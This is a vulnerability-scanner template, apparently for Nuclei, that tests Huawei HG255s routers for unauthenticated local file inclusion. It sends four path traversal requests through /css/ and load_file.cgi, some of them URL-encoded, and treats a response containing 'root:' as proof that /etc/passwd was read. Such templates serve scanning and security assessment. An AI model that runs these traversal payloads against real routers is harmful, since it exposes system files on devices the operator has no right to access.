id: huawei-hg255s-lfi

info:
  name: Huawei HG255s Local File Inclusion
  author: kamerka-fork
  severity: high
  description: |
    Huawei HG255s routers are vulnerable to local file inclusion
    allowing unauthenticated access to sensitive files on the device.
  metadata:
    max-request: 4
  tags: china-iot,huawei,lfi,ics

requests:
  - method: GET
    redirects: true
    max-redirects: 3
    path:
      - "{{BaseURL}}/css/..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
      - "{{BaseURL}}/cgi-bin/html/load_file.cgi?file=../../../../etc/passwd"
      - "{{BaseURL}}/cgi-bin/html/load_file.cgi?file=..%2F..%2F..%2Fetc%2Fpasswd"
      - "{{BaseURL}}/cgi-bin/html/load_file.cgi?file=..\..\..\..\etc\passwd"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "root:"
